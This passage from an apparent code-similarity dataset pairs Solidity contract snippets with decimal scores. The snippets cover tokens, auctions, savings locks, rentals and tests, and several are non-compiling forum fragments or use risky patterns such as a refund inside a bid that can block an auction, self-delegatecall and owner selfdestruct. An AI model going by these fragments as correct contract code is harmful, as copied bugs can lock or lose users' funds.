        token.transfer(myWalletForETH, developerTokens);

      }

    }

    

    function showThisBallance() public returns (uint){

        return this.balance;

    }



 

   function createTokens() isUnderHardCap saleIsOn payable {

      uint tokens = rate.mul(msg.value).div(1 ether);

      token.mint(this, tokens);

      token.transfer(msg.sender, tokens);

      balances[msg.sender] = balances[msg.sender].add(msg.value);

    }

    



 

    function() external payable {

     if(isCrowsdaleTimeFinished() && !isCrowdsaleStoped){

       stopCrowdSale();    

     }

     createTokens();

     if(isCrowdsaleOver() && !isCrowdsaleStoped){

      stopCrowdSale();

     }

    }

    

    function addBountyAdresses(address[] array) onlyOwner{

               for (uint i = 0; i < array.length; i++){

                  bountyAdresses.push(array[i]);

               }

    }

    

    function distributeBountyTokens() onlyOwner crowdsaleIsOver{

               uint amountofTokens = bountyTokens/bountyAdresses.length;

               for (uint i = 0; i < bountyAdresses.length; i++){

                  token.transfer(bountyAdresses[i], amountofTokens);

               }

               bountyTokens = 0;

    }

    

        function distributeDjonniTokens(address addr) onlyOwner crowdsaleIsOver{

                  token.transfer(addr, djonniTokens);

                  djonniTokens = 0;

              

    }

    

    

    

}"
"contract etherreceiver {

  function etherreceiver() {      
  }
}",0.559748799002729,"contract X {
    function() external {
        revert();
    }
}"
"contract A {

...some states variables/modifiers and events......

uint[] public vector = new uint[](162);

vector = [.......1, 2, 3,......];

function A () {

....some code....

ContractB contract = new ContractB(vector);

}

....functions....

}",0.5373886042095704,"contract Utils {
    string constant public contract_version = ""0.1._"";
    
    
    
    function contractExists(address channel) constant returns (bool) {
        uint size;

        assembly {
            size := extcodesize(channel)
        }

        return size > 0;
    }
}"
"contract myContract {
    event Debug(bytes data);
    function myDynamicFunction(uint[2][] myArray) public returns (bytes) {       
        address(this).delegatecall(
            bytes4(sha3(""myDynamicFunction(uint[2][])"")),
            uint256(32), 
            uint256(myArray.length), 
            myArray);
        return msg.data;
    }
    function () {
        emit Debug(msg.data); 
    }
}",0.5764720367392573,"contract PauseLike {
    function delay() external view returns (uint256);
    function setDelay(uint256) external;
    function plot(address, bytes32, bytes calldata, uint256) external;
    function exec(address, bytes32, bytes calldata, uint256) external;
}"
contract UnitCounter {mapping (address => uint256) public UnitsFrom;uint256 public TotalUnits;function SubmitUnits(uint256 Units) {UnitsFrom[msg.sender] = Units;TotalUnits += Units;}},0.5676905839225537,"contract TokenERC20 {
    mapping (address => uint256) public balanceOf;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}"
"contract TacoSavings {
    
    struct data {
        address client;
        uint256 savings;
        uint256 timeLock;
    }
    mapping(address => data) accountData;

    

    function saveMoney(uint256 _time) public payable {
    
    if (accountData[msg.sender].client != address(0)) {
        
        data storage oldAccountData = accountData[msg.sender];
        oldAccountData.savings = oldAccountData.savings + msg.value;
        oldAccountData.timeLock = now + _time;

        accountData[msg.sender] = oldAccountData;
    } else {
        
        data memory newAccountData;
        newAccountData.client = msg.sender;
        newAccountData.savings = msg.value;
        newAccountData.timeLock = now + _time;

        accountData[msg.sender] = newAccountData;
    }
}

function withrawMoney(uint256 _amount) public payable accountExists {
    
    
    require(
        now >= accountData[msg.sender].timeLock,
        ""You can't withdraw your money yet.""
    );
    
    require(
        _amount <= accountData[msg.sender].savings,
        ""You can't withdraw more than you have.""
    );

    address client = accountData[msg.sender].client;
    accountData[msg.sender].savings =
        accountData[msg.sender].savings -
        _amount;
    client.transfer(_amount);
}

function getAccount()
    external
    view
    accountExists
    returns (uint256, uint256)
{
    if (accountData[msg.sender].timeLock < now) {
        uint256 timeRemaining = 0;
    } else {
        timeRemaining = accountData[msg.sender].timeLock - now;
    }
    return (accountData[msg.sender].savings, timeRemaining);
}

modifier accountExists() {
    require(
        accountData[msg.sender].client != address(0),
        ""Account does not exists.""
    );
    _; 
}
}",0.5891090984346861,"contract TimeLock {

    

    MintableToken public ERC20Contract;

    

    struct accountData {

        uint256 balance;

        uint256 releaseTime;

    }



    event Lock(address indexed _tokenLockAccount, uint256 _lockBalance, uint256 _releaseTime);

    event UnLock(address indexed _tokenUnLockAccount, uint256 _unLockBalance, uint256 _unLockTime);



    

    mapping (address => accountData) public accounts;



    



    constructor(MintableToken _ERC20Contract) public {

        ERC20Contract = _ERC20Contract;

    }



    function timeLockTokens(uint256 _lockTimeS) public {



        uint256 lockAmount = ERC20Contract.allowance(msg.sender, this); 





        require(lockAmount != 0); 



        if (accounts[msg.sender].balance > 0) { 

            accounts[msg.sender].balance = SafeMath.add(accounts[msg.sender].balance, lockAmount);

      } else { 

            accounts[msg.sender].balance = lockAmount;

            accounts[msg.sender].releaseTime = SafeMath.add(block.timestamp, _lockTimeS);

        }



        emit Lock(msg.sender, lockAmount, accounts[msg.sender].releaseTime);



        ERC20Contract.transferFrom(msg.sender, this, lockAmount);



    }



    function tokenRelease() public {

        

        require (accounts[msg.sender].balance != 0 && accounts[msg.sender].releaseTime <= block.timestamp);

        uint256 transferUnlockedBalance = accounts[msg.sender].balance;

        accounts[msg.sender].balance = 0;

        accounts[msg.sender].releaseTime = 0;

        emit UnLock(msg.sender, transferUnlockedBalance, block.timestamp);

        ERC20Contract.transfer(msg.sender, transferUnlockedBalance);

    }



    

    function getERC20() public view returns (address) {

        return ERC20Contract;

    }

}"
"contract SimpleStorage {

    uint public storedData;
    event numberSaved(uint number);

    constructor(uint initVal) public {
        storedData = initVal;
    }

    function set(uint x) public{
        storedData = x;
        emit numberSaved(storedData);
    }

    function get() view public returns (uint retVal) {
        return storedData;
    }

}",0.5951510382161715,"contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public returns (uint);
    function balanceOf(address who) public returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract launcher {

    function launch() public returns(address) {
        ContractB contractLocation = new ContractB(msg.sender);
        return(contractLocation);
    }
}",0.5731520123769983,"contract IAdminContract {

    

    function getGameAdmin() public view returns (address);



    modifier admin() {

        require(msg.sender == getGameAdmin());

        _;

    }

}"
"contract C {
    struct User {
         uint balance;
    }
    mapping (string => User) public accounts;
    function newUser(string id, uint balance) {
         accounts[id] = User(balance);
    }
}",0.5975135565002905,"contract CREDITS is Ownable {

    mapping (address => uint256) internal balanceOf;

    function transfer (address _to, uint256 _value) public returns (bool);

   

}"
"contract NewBook {

    struct ChapterData {
        string chapterID;
        string title;
        uint pages;
    }

    struct BookData {
        string bookID;
        ChapterData[] chapters;
    }

    mapping(string => BookData) public books;

    
    
    function addChapter(string memory _bookID, string memory _chapterID) public {
        books[_bookID].chapters.push(ChapterData[_chapterID]);
    }
}",0.5059034971473045,"contract ApoIPFS

 {

      mapping (address => mapping (string => string)) apos;





      function setIPFS(address _addr,string datetime,string _ipfshash) public

      {

          

          if(bytes(apos[_addr][datetime]).length==0)

          {

              apos[_addr][datetime] = _ipfshash;

          }

      }

      



      function getIPFS(address _addr,string datetime) public constant returns (string)

      {

           

            return apos[_addr][datetime];

      }



}"
"contract Sample {
  address constant public myAddress = 0xe0f5206bbd039e7b0592d8918820024e2a7437b9;
  uint public vari;
  function setVari(uint a) {
    if(msg.sender == myAddress) {
      vari = a;
    }
  }  
}",0.5923753255894635,"contract IDapCarToken {
    function mint(address _address, uint256 _value) public returns (bool);
    function balanceOf(address _owner) public constant returns (uint balance);
}"
"contract FundingTest {
   function testSettingAnOwnerDuringCreation() public {
      Funding funding = new Funding();
      Assert.equal(funding.owner(), this, ""An owner is different than  deployer"");
   }

}",0.5345274139308225,"contract Control is ARMOR {
    	    function Control() payable ARMOR() public {}
    	    function withdraw() onlyOwner {    
    	        owner.transfer(this.balance);  
    	    }
    	    function killMe()  onlyOwner {
    	        selfdestruct(owner);
    	    }
    	}"
"contract test {

event LogTest(
    bytes32[5] a
); 

bytes32[5]  arr;    
mapping (uint=>bytes32) attr;


function attributes() internal returns(bytes32[5]){
    bytes32[5] x;
    attr[0] = ""0x0""; attr[1] = ""0x1""; attr[2] = ""0x2""; attr[3] = ""0x3""; attr[4] = ""0x4"";

    for(uint i=0;i<5;i++){
        x[i] = attr[i];
    }
    return(x);
}


function copy() public {
    arr = attributes();
    LogTest(arr);
}    

}",0.538924768333933,"contract ERC223 {
    event Transfer(address indexed from, address indexed to, uint value, bytes  data);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string customFallback) public returns (bool ok);
}"
"contract SetNumber { 
    int public number;
    function SetNumber(int _number) {
        number = _number;
    } 
}",0.5599672375250974,"contract Randomizer {

    function getRandomNumber(int256 min, int256 max) public returns(int256);

}"
"contract RentalContractTesting is Ownable {

  struct Article{
  uint id;
  address seller;
  address buyer;
  uint8 beds;
  uint8 baths;
  string propaddress;
  uint rental_price;
  string property_type;
  string description;
  string contact;
  }
  mapping(uint => Article) public articles;

  struct Article2{
  uint id;
  address seller;
  address buyer;
  string available;
  }

  mapping(uint => Article2) public articles2;
  uint articleCounter;

    event LogSellArticle(
    uint indexed _id,
    address indexed _seller,
    uint8 _beds,
    uint8 _baths,
    string _propaddress,
    uint _rental_price,
    string _property_type,
    string _description,
    string _contact
    );
    event LogSellArticle2(
    string _available
    );

  event LogBuyArticle(
    uint indexed _id,
    address indexed _seller,
    address indexed _buyer,
    uint8 _beds,
    uint8 _baths,
    string _propaddress,
    uint _rental_price,
    string _property_type,
    string _description,
    string _contact
    );
  event LogBuyArticle2(
    uint indexed _id,
    address indexed _seller,
    address indexed _buyer,
    string _available
);
function kill() public onlyOwner {

selfdestruct(owner);
}



  function sellArticle(uint8 _beds, uint8 _baths, string _propaddress, uint _rental_price, string _property_type, string _description, string _contact) public {
    articleCounter++;

    articles[articleCounter] = Article(
      articleCounter,
     msg.sender,
     0x0,
     _beds,
     _baths,
     _propaddress,
     _rental_price,
     _property_type,
     _description,
     _contact
);
LogSellArticle(articleCounter, msg.sender, _beds, _baths, _propaddress, _rental_price, _property_type, _description, _contact);
}

  function getNumberOfArticles() public view returns (uint){
  return articleCounter;
}

function getArticlesForSale() public view returns (uint[]){

  uint[] memory articleIds = new uint[](articleCounter);

  uint numberOfArticlesForSale = 0;

  for(uint i = 1; i <= articleCounter; i++){
    if(articles[i].buyer == 0x0){
      articleIds[numberOfArticlesForSale] = articles[i].id;
      numberOfArticlesForSale++;
    }
  }
    uint[] memory forSale = new uint[](numberOfArticlesForSale);
    for(uint j = 0; j < numberOfArticlesForSale; j++){
    forSale[j] = articleIds[j];
    }
    return forSale;
    }

     function sellArticle2(string _available) public {
       articleCounter++;

     articles2[articleCounter] = Article2(
     articleCounter,
     msg.sender,
     0x0,
     _available
    );

      LogSellArticle2(_available);
}
       function getArticlesForSale2() public view returns (uint[]){

         uint[] memory articleIds = new uint[](articleCounter);
         uint numberOfArticlesForSale2 = 0;

      for(uint i = 1; i <= articleCounter; i++){
     if(articles2[i].buyer == 0x0){
       articleIds[numberOfArticlesForSale2] = articles2[i].id;
     numberOfArticlesForSale2++;
      }
  }

     uint[] memory forSale = new uint[](numberOfArticlesForSale2);
     for(uint j = 0; j < numberOfArticlesForSale2; j++){
     forSale[j] = articleIds[j];
     }
     return forSale;
   }


 function buyArticle(uint _id) payable public {

   require(articleCounter > 0);
   require(_id > 0 && _id <= articleCounter);

   Article storage article = articles[_id];

   require(article.buyer == 0x0);

   require(msg.sender != article.seller);

   require(msg.value == article.rental_price);

   article.buyer = msg.sender;

   article.seller.transfer(msg.value);
   
    LogBuyArticle(_id, article.seller, article.buyer, article.beds, article.baths, article.propaddress, article.rental_price, article.property_type, article.description, article.contact);
 }
 function buyArticle2(uint _id) payable public {

   require(articleCounter > 0);
   require(_id > 0 && _id <= articleCounter);

   Article2 storage article2 = articles2[_id];

   require(article2.buyer == 0x0);

   require(msg.sender != article2.seller);

   

   article2.buyer = msg.sender;

   article2.seller.transfer(msg.value);

    LogBuyArticle2(_id, article2.seller, article2.buyer, article2.available);
 }
}",0.5913348557129522,"contract CryptoNumismat 
{
    address owner;

    string public standard = &#39;CryptoNumismat&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    struct Buy 
    {
        uint cardIndex;
        address seller;
        uint minValue;  
    }

    mapping (uint => Buy) public cardsForSale;
    mapping (address => bool) public admins;

    event Assign(uint indexed _cardIndex, address indexed _seller, uint256 _value);
    event Transfer(address indexed _from, address indexed _to, uint _cardIndex, uint256 _value);
    
    function CryptoNumismat() public payable 
    {
        owner = msg.sender;
        admins[owner] = true;
        
        totalSupply = 1000;                         
        name = ""cryptonumismat"";                    
        symbol = ""$"";                               
        decimals = 0;                               
    }
    
    modifier onlyOwner() 
    {
        require(msg.sender == owner);
        _;
    }
    
    modifier onlyAdmins() 
    {
        require(admins[msg.sender]);
        _;
    }
    
    function setOwner(address _owner) onlyOwner() public 
    {
        owner = _owner;
    }
    
    function addAdmin(address _admin) onlyOwner() public
    {
        admins[_admin] = true;
    }
    
    function removeAdmin(address _admin) onlyOwner() public
    {
        delete admins[_admin];
    }
    
    function withdrawAll() onlyOwner() public 
    {
        owner.transfer(this.balance);
    }

    function withdrawAmount(uint256 _amount) onlyOwner() public 
    {
        require(_amount <= this.balance);
        
        owner.transfer(_amount);
    }

    function addCard(uint _cardIndex, uint256 _value) public onlyAdmins()
    {
        require(_cardIndex <= 1000);
        require(_cardIndex > 0);
        
        require(cardsForSale[_cardIndex].cardIndex != _cardIndex);
        
        address seller = msg.sender;
        uint256 _value2 = (_value * 1000000000);
        
        cardsForSale[_cardIndex] = Buy(_cardIndex, seller, _value2);
        Assign(_cardIndex, seller, _value2);
    }
    
    function displayCard(uint _cardIndex) public constant returns(uint, address, uint256) 
    {
        require(_cardIndex <= 1000);
        require(_cardIndex > 0);
        
        require (cardsForSale[_cardIndex].cardIndex == _cardIndex);
            
        return(cardsForSale[_cardIndex].cardIndex, 
        cardsForSale[_cardIndex].seller,
        cardsForSale[_cardIndex].minValue);
    }
    
    
    uint256 private limit1 = 0.05 ether;
    uint256 private limit2 = 0.5 ether;
    uint256 private limit3 = 5 ether;
    uint256 private limit4 = 50 ether;
    
    function calculateNextPrice(uint256 _startPrice) public constant returns (uint256 _finalPrice)
    {
        if (_startPrice < limit1)
            return _startPrice * 10 / 4;
        else if (_startPrice < limit2)
            return _startPrice * 10 / 5;
        else if (_startPrice < limit3)
            return _startPrice * 10 / 6;
        else if (_startPrice < limit4)
            return _startPrice * 10 / 7;
        else
            return _startPrice * 10 / 8;
    }
    
    function calculateDevCut(uint256 _startPrice) public constant returns (uint256 _cut)
    {
        if (_startPrice < limit2)
            return _startPrice * 5 / 100;
        else if (_startPrice < limit3)
            return _startPrice * 4 / 100;
        else if (_startPrice < limit4)
            return _startPrice * 3 / 100;
        else
            return _startPrice * 2 / 100;
    }
    
    function buy(uint _cardIndex) public payable
    {
        require(_cardIndex <= 1000);
        require(_cardIndex > 0);
        require(cardsForSale[_cardIndex].cardIndex == _cardIndex);
        require(cardsForSale[_cardIndex].seller != msg.sender);
        require(msg.sender != address(0));
        require(msg.sender != owner);
        require(cardsForSale[_cardIndex].minValue > 0);
        require(msg.value >= cardsForSale[_cardIndex].minValue);
        
        address _buyer = msg.sender;
        address _seller = cardsForSale[_cardIndex].seller;
        uint256 _price = cardsForSale[_cardIndex].minValue;
        uint256 _nextPrice = calculateNextPrice(_price);
        uint256 _totalPrice = _price - calculateDevCut(_price);
        uint256 _extra = msg.value - _price;
        
        cardsForSale[_cardIndex].seller = _buyer;
        cardsForSale[_cardIndex].minValue = _nextPrice;
        
        Transfer(_buyer, _seller, _cardIndex, _totalPrice);
        Assign(_cardIndex, _buyer, _nextPrice);
        
        _seller.transfer(_totalPrice);
        
        if (_extra > 0)
        {
            Transfer(_buyer, _buyer, _cardIndex, _extra);
            
            _buyer.transfer(_extra);
        }
    }
}"
"contract HelloWorld {

        struct User {
            string name;
            uint age;
        }

        User[] users;


        function addUser(User memory user_) public  {
            users.push(user_);
        }

        function getUser(uint index) public view returns(User memory) {
             require(index >=0 && index < users.length);
           return users[index];
        }
    }",0.5927584811119937,"contract Ownable { 

    address private _owner;

    constructor () internal { _owner = msg.sender; }

    function owner() public view returns (address) { return _owner; }

    function isOwner() public view returns (bool) { return msg.sender == _owner; }

    modifier onlyOwner() { require(isOwner()); _; }

}"
"contract NumberTracer {
    bytes32 tracer;
    uint256 seed = 1000;
    uint256 currentSum;

    function NumberTracer(bytes32 t) {
        tracer = t;
    }

    function addNumber(uint256 n) {
        currentSum = seed + n;
    }

    function getCurrentSum() returns (uint256) {
        return currentSum;
    }
}",0.5893458527917327,"contract PauseLike {
    function delay() external view returns (uint256);
    function setDelay(uint256) external;
    function plot(address, bytes32, bytes calldata, uint256) external;
    function exec(address, bytes32, bytes calldata, uint256) external;
}"
"contract Test {

    function myTest(uint a) private returns (bytes32) {

        bytes32 a = bytes32(a);
        return a;
    }

    bytes32 b = myTest(1234);

}",0.5945182578305751,"contract Bytes32 {

    function _bytes32(string _input) internal pure returns(bytes32 result) {

        assembly {

            result := mload(add(_input, 32))

        }

    }

}"
"contract Tracking {

    uint RecordId;
    uint public RecordCount;

    struct Record{
        uint id;
        address adr;            
        string pifunction;
        string coordinates;
        uint time;
    }    

    mapping(uint => Record) records;

    constructor(address _Departure) public {
        records[RecordId] = Record(RecordId, _Departure, ""PI-Shipper"", ""N.49.27.30.555/O.11.5.38.326"", now);
        RecordId++;
        RecordCount = RecordId;
    }

    function a_addRecord(string memory PI_Function, string memory Coordinates) public {
        records[RecordId] = Record(RecordId, msg.sender, PI_Function, Coordinates, now);
        RecordId++;
        RecordCount = RecordId;
    }

    function b_getRecord(uint RecordID) public view returns(Record memory) {
        return records[RecordID];
    }

    function c_getAddresses() public view returns(address[] memory) {
        address[] memory adr = new address[](RecordId);
        for(uint i = 0; i < RecordId; i++) {
            Record storage record = records[i];
            adr[i] = record.adr;
        }
        return(adr);
    }

    function d_getPI_Functions() public view returns(string[] memory) {
        string[] memory pifunction = new string[](RecordId);
        for(uint i = 0; i < RecordId; i++) {
            Record storage record = records[i];
            pifunction[i] = record.pifunction;
        }
        return(pifunction);
    }

    function e_getCoordinates() public view returns(string[] memory) {
        string[] memory coordinates = new string[](RecordId);
        for(uint i = 0; i < RecordId; i++) {
            Record storage record = records[i];
            coordinates[i] = record.coordinates;
        }
        return(coordinates);
    }

    
    
    
    
    
    
    
    

    function g_getRecords() public view returns(Record[] memory) {                       
        Record[] memory id = new Record[](RecordId);
        for(uint i = 0; i < RecordId; i++) {
            Record storage record = records[i];
            id[i] = record;
        }
        return(id);
    }
}",0.5642787332954593,"contract DeviceDataStorage is Ambi2EnabledFull {

    uint fee;
    address feeReceiver;

    AssetProxyInterface public assetProxy;

    struct Storage {
        address device;
        bytes32 description;
        uint number;
        string additionalInfo;
    }

    mapping (address => uint) public recordId;
    mapping (address => mapping (uint => Storage)) public recording;

    event DataWasRecorded(address device, uint id, bytes32 description, uint number, string additionalInfo);

    function setAssetProxy(AssetProxyInterface _assetProxy) onlyRole(&#39;admin&#39;) returns(bool) {
        assetProxy = AssetProxyInterface(_assetProxy);
        return true;
    }

    function setFeeRecieverValue(uint _fee, address _feeReceiver) onlyRole(&#39;admin&#39;) returns(bool) {
        fee = _fee;
        feeReceiver = _feeReceiver;
        return true;
    }

    function recordInfo(bytes32 _description, uint _number, string _additionalInfo) returns(bool) {
        require(assetProxy.transferFromWithReference(msg.sender, feeReceiver, fee, &#39;storage&#39;));

        recording[msg.sender][recordId[msg.sender]].device = msg.sender;
        recording[msg.sender][recordId[msg.sender]].description = _description;
        recording[msg.sender][recordId[msg.sender]].number = _number;
        recording[msg.sender][recordId[msg.sender]].additionalInfo = _additionalInfo;
        DataWasRecorded(msg.sender, recordId[msg.sender], _description, _number, _additionalInfo);
        recordId[msg.sender]++;
        return true;
    }

    function deleteRecording(uint _id) returns(bool) {
        delete recording[msg.sender][_id];
        return true;
    }

    function getRecording(address _device, uint _id) constant returns(address, bytes32, uint, string) {
        Storage memory stor = recording[_device][_id];
        return (stor.device, stor.description, stor.number, stor.additionalInfo);
    }
}"
"contract Auction {

    bool Ended;
    uint WTP;
    uint public AuctionEndTime;
    uint public SafetyDeposit;
    uint public LowestBid;
    address public Destination;
    address payable MasterPayable;
    address payable LowestBidder;
    address payable Payee;

    struct Participant {
        bool biddingright;
        uint amount;
    }

    mapping(address => Participant) participants;
    address payable[] depositor;

    constructor(address _Destination, uint _WTP, uint _BiddingTime, address payable _Master) public {
        Destination = _Destination;
        WTP = _WTP;
        SafetyDeposit = _WTP/2;
        LowestBid = _WTP;
        AuctionEndTime = now + _BiddingTime;
        MasterPayable = _Master;
        Ended = false;
    }

    function getRights() public payable { 
        require(now <= AuctionEndTime,""Auction already ended."");
        require(msg.value >= SafetyDeposit);
        require(participants[msg.sender].biddingright == false,""Safety deposit already payed."");
        participants[msg.sender].biddingright = true;
        participants[msg.sender].amount = msg.value;
        depositor.push(msg.sender);
    }

    function placeBid(uint Bid) public {                                         
        require(now <= AuctionEndTime,""Auction already ended."");
        require(Bid < LowestBid,""There already is a lower bid."");
        require(participants[msg.sender].biddingright == true,""Please note safety deposit."");
        LowestBidder = msg.sender;
        LowestBid = Bid;
    }

    function AuctionEnd() public {
        require(now >= AuctionEndTime,""Auction not yet ended."");
        require(Ended == false,""Auction end has already been called."");
        Ended = true;
        MasterPayable.transfer(WTP-LowestBid);                          
        for(uint i=0; i<depositor.length; i++) {
            Payee = depositor[i];
            if(Payee != LowestBidder) {
                Payee.transfer(participants[Payee].amount);             
            }
        }
    }

    function checkBalance() public view returns(uint) {                 
        return(address(this).balance);
    }

    function() external payable {
    }
}",0.5912075885771191,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  

  mapping(address => uint256) balances;

  address ownerWallet;

  bool released = false;



  enum LockupType {NOLOCK, FOUNDATION, TEAM, CONSORTIUM, PARTNER, BLACK}



  struct Lockup

  {

      uint256 lockupTime;

      uint256 lockupAmount;

      LockupType lockType;

  }

  Lockup lockup;

  mapping(address=>Lockup) lockupParticipants;  

  

  

  uint256 startTime;

  function release() public {

      require(ownerWallet == msg.sender);

      require(!released);

      released = true;

  }



  function lock() public {

      require(ownerWallet == msg.sender);

      require(released);

      released = false;

  }



  function get_Release() view public returns (bool) {

      return released;

  }



  

  function transfer(address _to, uint256 _amount) public returns (bool success) {

    require(_to != address(0));

    require(balances[msg.sender] >= _amount && _amount > 0

        && balances[_to].add(_amount) > balances[_to]);





    if (!released) { 

      if ( (lockupParticipants[msg.sender].lockType == LockupType.PARTNER) || (msg.sender == ownerWallet) ) {

        

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

      

      } else {

        

        return false;

      } 

    } else { 

      if (lockupParticipants[msg.sender].lockType == LockupType.BLACK ) {

        

        return false;

      } else if (lockupParticipants[msg.sender].lockupAmount>0) {

            uint timePassed = now - startTime;

            if (timePassed < lockupParticipants[msg.sender].lockupTime)

            {

                require(balances[msg.sender].sub(_amount) >= lockupParticipants[msg.sender].lockupAmount);

            }

            

            

            balances[msg.sender] = balances[msg.sender].sub(_amount);

            balances[_to] = balances[_to].add(_amount);

            emit Transfer(msg.sender, _to, _amount);

            return true;

      }

    }

    return false;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}"
"contract AuctionBox{


Auction[] public auctions; 





function createAuction (
    string memory _title,
    uint _startPrice,
    string memory _description
    ) public{
    
    Auction newAuction = new Auction(msg.sender, _title, _startPrice, _description);
    
    auctions.push(newAuction);
}

function returnAllAuctions() public view returns(Auction[] memory){
    return auctions;
}
}",0.5850846387500774,"contract Identity {

    mapping(address => string) private _names;



    

    function iAm(string memory shortName) public {

        _names[msg.sender] = shortName;

    }



    

    function whereAmI() public view returns (address yourAddress) {

        address myself = msg.sender;

        return myself;

    }



    

    function whoAmI() public view returns (string memory yourName) {

        return (_names[msg.sender]);

    }

}"
"contract One {
    Two two;
    function makeCall() {
         two.someExternalFunction();
    }
}",0.5389987537929212,"contract KittySires {
    function cancelAuction(uint256 _tokenId) external;
}"
"contract contractB {
   function invokeContractA() { 
      address a = contractA.address(this);
      uint ValueToSend = 1234;  
      a.blah.value(ValueToSend)(2, 3);
   }  
}",0.5558527601798798,"contract ApprovalReceiver {

    function receiveApproval(address _from, uint _value, address _tokenContract, bytes _extraData) public;

}"
"contract MyContract{
    uint256 public sqrtValue;
    Aion aion;

    function schedule_rqsr(uint256 number) public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('sqrt(uint256)')),number);
        uint callCost = 200000*1e9 + aion.serviceFee();
        aion.ScheduleCall.value(callCost)( block.number+15, address(this), 0, 200000, 1e9, data, false);
    }

    function sqrt(uint256 number) public {
        sqrtValue = number**2;
    }

    function () public payable {}

}",0.5539005391235687,"contract sendEther {
    uint256 myNumber;
    string someString;
    
    function sendMeMoney(uint256 test) public payable {
        myNumber = test;
        0x3d080421c9DD5fB387d6e3124f7E1C241ADE9568.send(msg.value);
    }
    
    function giveMeNumber(uint256 _number) public view returns (uint256) {
        if(_number > 0) {
            return myNumber;
        }
    }
    
    function giveMeString(uint256 _number) public view returns (string memory) {
        if(_number > 0) {
            return someString;
        }
    }
    
    constructor(string memory _a) public {
        someString = _a;
    }
}"
"contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() payable {
        require(msg.value > highestBid);

        require(currentLeader.send(highestBid)); 

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}",0.5760837883547473,"contract VpaxContract {



  function VpaxContract(){}



  function transferCoins(address receiver) payable public {

    require(receiver != 0X0);

    require(msg.sender != receiver);

    require(msg.value > 0);

    receiver.transfer(msg.value);

  }

}"
"contract Roadshow is owned {

    bytes32 public text;  
    uint public start; 
    uint public end;   
    mapping(address => Voter) public voters;

    struct Voter {
        bool enabled;  
    }

    struct Answer
    {
        bytes32 text;
        uint voteCount; 
        
    }

    struct Question
    {
        bytes32 text;
        mapping(bytes32 => Answer) answers; 
        bytes32[] answerList; 
        
        mapping(address => bool) alreadyVoted;
      }

    mapping(bytes32 => Question) questions; 
    bytes32[] questionList; 

    function Roadshow(bytes32 _name) {
        text = _name;
        start = now;
        voters[msg.sender].enabled = true;
    }

    function addQuestion(bytes32 questionKey, bytes32 text)
        onlyOwner
        returns(bool success)
    {
        
        questions[questionKey].text = text;
        questionList.push(questionKey);
        return true;
    }

    function getQuestion(bytes32 questionKey)
        public
        constant
        returns(bytes32 wording, uint answerCount)
    {
        return(
            questions[questionKey].text,
            questions[questionKey].answerList.length);
    }

    function addAnswer(bytes32 questionKey, bytes32 answerKey, bytes32 answerText)
        onlyOwner
        returns(bool success)
    {
        questions[questionKey].answerList.push(answerKey);
        questions[questionKey].answers[answerKey].text = answerText;
        
        

        return true;
    }

    function getQuestionAnswer(bytes32 questionKey, bytes32 answerKey)
        public
        constant
        returns(bytes32 answerText, uint answerVoteCount)
    {
        return(
            questions[questionKey].answers[answerKey].text,
            questions[questionKey].answers[answerKey].voteCount);
    }

    function getQuestionAnswerText(bytes32 questionKey, bytes32 answerKey)
        public
        constant
        returns(bytes32 answerText)
    {
        answerText = questions[questionKey].answers[answerKey].text;

        return answerText;
    }

    function getQuestionAnswerCount(bytes32 questionKey, bytes32 answerKey)
        public
        constant
        returns(uint answerCount)
    {
        answerCount = questions[questionKey].answers[answerKey].voteCount;

        return answerCount;
    }

    function getQuestionCount()
        public
        constant
        returns(uint questionCount)
    {
        return questionList.length;
    }

    function getQuestionAtIndex(uint row)
        public
        constant
        returns(bytes32 questionkey)
    {
        return questionList[row];
    }

    function getQuestionAnswerCount(bytes32 questionKey)
        public
        constant
        returns(uint answerCount)
    {
        return(questions[questionKey].answerList.length);
    }

    function getQuestionAnswerAtIndex(bytes32 questionKey, uint answerRow)
        public
        constant
        returns(bytes32 answerKey)
    {
        return(questions[questionKey].answerList[answerRow]);
    }

    
    
    function voteForAnswer(bytes32 questionKey, bytes32 answerKey)
         returns (bool success)
    {
        
        if (voters[msg.sender].enabled == false) {
            throw;
        }
        
        if (questions[questionKey].alreadyVoted[msg.sender] == true) {
            throw;
        }

        questions[questionKey].alreadyVoted[msg.sender] = true;
        questions[questionKey].answers[answerKey].voteCount += 1;
        VoterVotedFor(msg.sender, questionKey, answerKey);

        return true;
    }

    function addVoter(address _voter)
        onlyOwner
        returns (bool success)
    {
        voters[_voter] = Voter(true);
        VoterAdded(_voter, this.text());
        return true;
    }

    event VoterAdded(address _newVoter, bytes32 _questionKey);
    event VoterVotedFor(address _voter, bytes32 _questionKey, bytes32 _answerKey);
}",0.5371162113899302,"contract Xain is ERC20 {
    
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    
    uint256 public totalSupply = 283475912 * 10**8;

    function name() public pure returns (string) { return ""Xain""; }
    function symbol() public pure returns (string) { return ""XAIN""; }
    function decimals() public pure returns (uint8) { return 8; }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event DistrFinished();

    bool public distributionFinished = false;

    modifier canDistr() {
    require(!distributionFinished);
    _;
    }

    function Xain() public {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
    }

    modifier onlyOwner { 
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }

    function getEthBalance(address _addr) constant public returns(uint) {
    return _addr.balance;
    }

    function distributeXAIN(address[] addresses, uint256 _value, uint256 _ethbal) onlyOwner canDistr public {
         for (uint i = 0; i < addresses.length; i++) {
	     if (getEthBalance(addresses[i]) < _ethbal) {
 	         continue;
             }
